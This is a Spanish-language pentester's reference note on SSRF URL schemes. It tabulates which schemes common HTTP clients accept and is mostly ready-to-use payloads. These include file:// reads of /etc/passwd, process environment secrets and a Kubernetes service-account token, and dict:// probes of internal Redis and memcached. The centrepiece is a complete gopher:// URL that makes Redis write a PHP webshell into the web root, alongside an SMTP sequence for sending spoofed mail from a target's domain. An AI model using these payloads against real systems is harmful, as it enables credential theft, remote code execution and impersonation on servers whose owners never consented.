---
tipo: meta
aliases:
  - Esquemas SSRF
  - gopher payloads
tags:
  - meta/referencia
  - dominio/web
---

# SSRF esquemas - matriz de referencia

> [!info] Referencia pura, no un zettel
> Qué esquemas acepta cada cliente y qué se puede hacer con cada uno. El criterio está en [[SSRF - gopher a servicio interno]].

## 1. Soporte por cliente

Lo primero es saber quién hace la petición: el esquema disponible depende del cliente, no de la aplicación.

| Cliente | Esquemas útiles |
|---|---|
| `libcurl` | `http` `https` `ftp` `file` `dict` `ldap` `smtp` · `gopher` **deshabilitado por defecto** desde finales de 2022 |
| PHP `file_get_contents` | `http` `https` `ftp` `file` `php` `data` `zip` `phar` |
| Java | `http` `https` `ftp` `file` `jar` `netdoc` |
| Python `urllib` | `http` `https` `ftp` `file` |
| Node `fetch` / `axios` | `http` `https` únicamente |
| Ruby `open-uri` | `http` `https` `ftp` |

Node es el más cerrado y Java el más abierto. `netdoc://` en Java es un sustituto de `file://` que sobrevive a filtros que solo bloquean el nombre obvio, y `jar:` permite alcanzar archivos dentro de un archivo remoto.

`phar://` en PHP no lee: **deserializa**. Ver [[LFI - phar deserialization]].

> [!warning] `gopher` caduca
> Es la razón por la que esta técnica exige revalidación. Antes de invertir en construir un payload, confirmar que el esquema existe: pedir `gopher://127.0.0.1:1/` y comparar la respuesta con la de un esquema inventado como `xyz://127.0.0.1:1/`. Si son idénticas, no hay soporte.

## 2. Lectura local

`file:///etc/passwd`
`file:///proc/self/environ`
`file:///proc/self/cwd/config.php`
`file:///var/run/secrets/kubernetes.io/serviceaccount/token`
Sin red de por medio. `/proc/self/environ` suele traer los secretos del proceso.

`netdoc:///etc/passwd`
Java, cuando `file` está filtrado.

## 3. `dict://` — un comando suelto

`dict://127.0.0.1:6379/info`
Redis. Devuelve el banner y la salida de `INFO`.

`dict://127.0.0.1:11211/stats`
memcached.

`dict://127.0.0.1:22/`
Banner de SSH. Sirve para identificar servicio y versión sin `gopher`.

Limitación: manda **una** línea. No sirve para secuencias, que es lo que hace falta para escribir en Redis.

## 4. `gopher://` — bytes arbitrarios

Estructura: `gopher://HOST:PUERTO/_` seguido del contenido. **El `_` es obligatorio** — el primer carácter después de la barra se descarta como tipo de recurso, y sin él se pierde el primer byte del payload.

Los saltos de línea van codificados como `%0d%0a`. Si el payload lleva `%` propios, hay que codificar dos veces según por dónde pase la URL.

**Redis a escritura de archivo**, en forma legible:

```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET[0]);?>"
SAVE
```

Como URL:

`gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20"<?php%20system($_GET[0]);?>"%0d%0aSAVE%0d%0a`

Deja una webshell en la raíz web. Ver [[Webshells - matriz de referencia]] para el contenido y [[Webshell]] para el criterio.

> [!danger] `CONFIG SET dir` rompe cosas
> Cambia el directorio de trabajo de Redis y deja `dbfilename` apuntando a un `.php`. Si el servicio persiste después, escribe su base ahí. **Restaurar los valores originales** —leídos antes con `CONFIG GET dir` y `CONFIG GET dbfilename`— es parte del trabajo, no una cortesía.

**SMTP**, para enviar correo desde el dominio del objetivo:

```
HELO x
MAIL FROM:<admin@objetivo.com>
RCPT TO:<victima@objetivo.com>
DATA
Subject: x

cuerpo
.
QUIT
```

**FastCGI en el 9000** da ejecución directa de PHP, pero el payload es binario y no se construye a mano: se genera con herramienta. Lo mismo para las variantes de Redis con RESP crudo.

## 5. Sin `gopher`

Cuando el esquema no está, quedan tres caminos y conviene evaluarlos en este orden:

1. **HTTP contra servicios que toleran basura al principio.** Elasticsearch, la API de Docker y los paneles internos hablan HTTP: no hace falta `gopher` para nada.
2. **`dict://`**, si alcanza con un comando.
3. **CRLF en la URL.** Si el cliente no valida los saltos de línea, se pueden inyectar cabeceras o comandos dentro de una petición HTTP normal. Es raro en clientes modernos, y vale probarlo igual porque cuesta una petición.
